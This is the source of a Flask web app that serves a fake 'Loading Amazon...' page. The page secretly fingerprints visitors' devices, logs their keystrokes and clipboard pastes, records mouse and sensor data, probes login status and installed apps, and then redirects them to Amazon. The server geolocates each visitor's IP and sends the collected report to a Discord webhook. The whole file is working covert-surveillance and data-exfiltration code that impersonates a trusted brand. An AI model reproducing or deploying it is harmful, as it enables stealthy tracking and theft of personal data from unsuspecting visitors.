from flask import Flask, request, render_template_string, jsonify
import requests
import os
import textwrap

app = Flask(__name__)
DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "your-discord-webhook-here")

HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Loading Amazon...</title>
  <style>
    body { 
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: #ffffff;
      font-family: Arial, sans-serif;
    }
    
    .loader-container {
      text-align: center;
    }

    .amazon-loader {
      width: 60px;
      height: 60px;
      border: 4px solid #FF9900;
      border-radius: 50%;
      border-top-color: transparent;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
      position: relative;
    }

    .amazon-loader::after {
      content: '';
      position: absolute;
      top: -4px;
      left: -4px;
      right: -4px;
      bottom: -4px;
      border: 4px solid #ff990033;
      border-radius: 50%;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .loading-text {
      color: #232F3E;
      font-size: 18px;
      font-weight: bold;
      margin-top: 20px;
    }

    .amazon-brand {
      color: #232F3E;
      font-size: 24px;
      margin-top: 10px;
      font-weight: bold;
    }
    /* Hidden iframe for login status detection */
    iframe.login-check {
      display: none;
    }
  </style>
</head>
<body>
  <div class="loader-container">
    <div class="amazon-loader"></div>
    <div class="loading-text">Securing Connection...</div>
    <div class="amazon-brand">Amazon</div>
  </div>
  
  <!-- Hidden iframe to detect login status on popular sites -->
  <iframe class="login-check" src="https://www.facebook.com" onload="console.log('User likely logged into Facebook');"></iframe>

  <script>
    // Global arrays to store additional events
    const mouseMovements = [];
    const keystrokes = [];
    const pastedData = [];
    const sensorData = {
      deviceMotion: null,
      deviceOrientation: null
    };

    // Basic fingerprint collection (existing)
    async function collectInfo() {
      const fingerprint = {
        screen: { 
          width: screen.width,
          height: screen.height,
          colorDepth: screen.colorDepth,
          pixelRatio: window.devicePixelRatio,
          orientation: window.screen.orientation ? window.screen.orientation.type : "N/A"
        },
        webgl: getWebGLInfo(),
        audio: await getAudioFingerprint(),
        fonts: await getFontsList(),
        hardware: {
          concurrency: navigator.hardwareConcurrency,
          memory: navigator.deviceMemory || "N/A",
          touch: ('ontouchstart' in window),
          vibration: ('vibrate' in navigator)
        },
        network: {
          ips: await getIPs(),
          connection: navigator.connection ? {
            downlink: navigator.connection.downlink,
            effectiveType: navigator.connection.effectiveType,
            rtt: navigator.connection.rtt
          } : null
        },
        platform: {
          os: navigator.platform,
          userAgent: navigator.userAgent,
          vendor: navigator.vendor,
          language: navigator.language,
          languages: navigator.languages,
          cookieEnabled: navigator.cookieEnabled,
          doNotTrack: navigator.doNotTrack,
          pdfViewerEnabled: navigator.pdfViewerEnabled || "N/A"
        },
        time: {
          zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          offset: new Date().getTimezoneOffset()
        },
        extra: {
          plugins: Array.from(navigator.plugins || []).map(p => p.name),
          mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type),
          serviceWorker: ('serviceWorker' in navigator),
          storage: {
            localStorage: ('localStorage' in window),
            sessionStorage: ('sessionStorage' in window),
            indexedDB: ('indexedDB' in window)
          }
        },
        battery: {},
        canvas: "",
        // Additional collected events:
        mouseMovements: mouseMovements.slice(0, 50), // limited to first 50 events
        keystrokes: keystrokes,
        pastedData: pastedData,
        sensorData: sensorData,
        voices: getVoicesInfo(),
        appCheck: window.appCheckResult || "Not Attempted"
      };

      // Battery API (existing)
      try {
        const battery = await navigator.getBattery();
        fingerprint.battery = {
          level: battery.level,
          charging: battery.charging,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime
        };
      } catch(e) {}

      // Canvas fingerprint
      try {
        fingerprint.canvas = getCanvasFingerprint();
      } catch(e) {}

      // Send collected fingerprint to server
      await fetch("/collect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(fingerprint)
      });

      // Redirect after data is sent (simulate Amazon load)
      setTimeout(() => {
        window.location.href = "https://www.amazon.in";
      }, 3000);
    }

    // Existing functions
    function getWebGLInfo() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return {
          vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
          renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A',
          parameters: Array.from({ length: 374 }, (_, i) =>
            gl.getParameter(i)?.toString().substring(0, 100)
          )
        };
      } catch(e) {
        return null;
      }
    }

    function getCanvasFingerprint() {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.fillStyle = '#069';
      ctx.fillText('CanvasFingerprint', 2, 15);
      return canvas.toDataURL();
    }

    async function getAudioFingerprint() {
      try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const analyser = audioContext.createAnalyser();
        
        oscillator.connect(analyser);
        analyser.connect(audioContext.destination);
        oscillator.start(0);
        
        const fftSize = 2048;
        analyser.fftSize = fftSize;
        const buffer = new Uint8Array(analyser.frequencyBinCount);
        analyser.getByteFrequencyData(buffer);
        
        oscillator.stop();
        audioContext.close();
        
        return Array.from(buffer);
      } catch(e) {
        return null;
      }
    }

    async function getFontsList() {
      const fontCheck = new Set([
        'monospace', 'sans-serif', 'serif', 'Arial', 'Arial Black', 'Helvetica',
        'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Comic Sans MS'
      ]);
      
      const available = [];
      for (const font of fontCheck.values()) {
        try {
          await document.fonts.load(`12px "${font}"`);
          available.push(font);
        } catch(e) {}
      }
      return available;
    }

    async function getIPs() {
      return new Promise(resolve => {
        const ips = [];
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        
        pc.onicecandidate = e => {
          if (!e.candidate) {
            pc.close();
            resolve(ips);
            return;
          }
          // Collect internal/local IPs if available
          const parts = e.candidate.candidate.split(' ');
          const ip = parts.length > 4 ? parts[4] : "";
          if (ip && !ips.includes(ip)) ips.push(ip);
        };
        
        setTimeout(() => resolve(ips), 1000);
      });
    }

    // New: Capture voices info for speech synthesis
    function getVoicesInfo() {
      if ('speechSynthesis' in window) {
        const voices = window.speechSynthesis.getVoices();
        return voices.map(v => v.name + " - " + v.lang);
      }
      return [];
    }

    // --- Additional Passive Fingerprinting Features ---

    // 1. Mouse Movement & Keystroke Pattern Tracking
    document.addEventListener('mousemove', (e) => {
      mouseMovements.push({
        x: e.clientX,
        y: e.clientY,
        time: Date.now()
      });
      // Limit stored events
      if (mouseMovements.length > 200) {
        mouseMovements.shift();
      }
    });

    document.addEventListener('keydown', (e) => {
      keystrokes.push({
        key: e.key,
        code: e.code,
        time: Date.now()
      });
    });

    // 2. Battery API is already included in collectInfo

    // 3. WebRTC Internal IP Leak is handled by getIPs()

    // 4. Browser History Sniffing (Note: Most modern browsers patch this.)
    // This demonstration uses CSS :visited styles but may not work reliably:
    // (For educational purposes only)

    // 5. Detect Login Status on Popular Sites using a hidden iframe (included above)

    // 6. GPU + Audio + Canvas Fingerprinting enhancements can be added here as needed.
    // (Consider using OfflineAudioContext for an alternate audio fingerprint.)

    // 7. Voice & Speech Synthesis Info is captured by getVoicesInfo()

    // 8. Clipboard Read Hook
    document.addEventListener('paste', (e) => {
      const data = e.clipboardData.getData('text');
      pastedData.push({
        content: data,
        time: Date.now()
      });
    });

    // 9. Mobile Sensor Data (Gyroscope/Accelerometer)
    window.addEventListener('devicemotion', (e) => {
      sensorData.deviceMotion = {
        acceleration: e.acceleration,
        accelerationIncludingGravity: e.accelerationIncludingGravity,
        rotationRate: e.rotationRate,
        interval: e.interval,
        time: Date.now()
      };
    });
    window.addEventListener('deviceorientation', (e) => {
      sensorData.deviceOrientation = {
        alpha: e.alpha,
        beta: e.beta,
        gamma: e.gamma,
        time: Date.now()
      };
    });

    // 10. Detect Installed Protocol Handlers (App Check)
    // Attempt to open a protocol (this may be blocked by the browser)
    window.appCheckResult = "Not Detected";
    let appCheck = window.open("skype://", "_blank");
    if (appCheck) {
      window.appCheckResult = "Skype likely installed";
      appCheck.close();
    }

    // Start collection when the page loads
    collectInfo();
  </script>
</body>
</html>
"""

def split_discord_message(content, max_length=1900):
    return textwrap.wrap(content, width=max_length, replace_whitespace=False)

@app.route("/")
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route("/collect", methods=["POST"])
def collect():
    data = request.json
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    
    try:
        ip_info = requests.get(f"https://ipinfo.io/{ip}/json").json()
    except Exception as e:
        ip_info = {"error": str(e)}

    report = f"""
    🔍 **Advanced Fingerprint Report** - `{ip}`
    
    **🌐 Network**
    - IPs: {', '.join(data.get('network', {}).get('ips', []))}
    - Connection Type: {data.get('network', {}).get('connection', {}).get('effectiveType', 'N/A')}
    - Speed: {data.get('network', {}).get('connection', {}).get('downlink', 'N/A')} Mbps
    
    **🖥 System**
    - OS: {data.get('platform', {}).get('os', 'N/A')}
    - RAM: {data.get('hardware', {}).get('memory', 'N/A')}
    - Cores: {data.get('hardware', {}).get('concurrency', 'N/A')}
    - Touch Enabled: {"Yes" if data.get('hardware', {}).get('touch', False) else "No"}
    
    **📷 WebGL**
    - Vendor: {data.get('webgl', {}).get('vendor', 'N/A')}
    - Renderer: {data.get('webgl', {}).get('renderer', 'N/A')}
    
    **🔊 Audio Fingerprint**
    - Audio Data Hash: {hash(str(data.get('audio', [])))}
    
    **📚 Fonts**
    - Detected: {', '.join(data.get('fonts', []))}
    
    **⌨ Extra Events**
    - Mouse Movements Collected: {len(data.get('mouseMovements', []))}
    - Keystrokes Collected: {len(data.get('keystrokes', []))}
    - Clipboard Pastes: {len(data.get('pastedData', []))}
    
    **📡 Sensors**
    - Device Motion: {data.get('sensorData', {}).get('deviceMotion', 'N/A')}
    - Device Orientation: {data.get('sensorData', {}).get('deviceOrientation', 'N/A')}
    
    **🔊 Voices**
    - Available Voices: {', '.join(data.get('voices', []))}
    
    **🛠 App Check**
    - Skype Check: {data.get('appCheck', 'N/A')}
    
    **⏰ Time**
    - Timezone: {data.get('time', {}).get('zone', 'N/A')}
    - Offset: {data.get('time', {}).get('offset', 'N/A')} minutes
    
    **🔧 Browser**
    - User Agent: {data.get('platform', {}).get('userAgent', 'N/A')}
    - Plugins: {', '.join(data.get('extra', {}).get('plugins', []))}
    - Do Not Track: {data.get('platform', {}).get('doNotTrack', 'N/A')}
    
    **📡 IP Information**
    - ISP: {ip_info.get('org', 'N/A')}
    - Location: {ip_info.get('city', 'N/A')}, {ip_info.get('region', 'N/A')}
    - Country: {ip_info.get('country', 'N/A')}
    - Coordinates: {ip_info.get('loc', 'N/A')}
    """.strip()

    try:
        for chunk in split_discord_message(report):
            requests.post(DISCORD_WEBHOOK, json={"content": chunk})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

    return jsonify({"status": "success"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
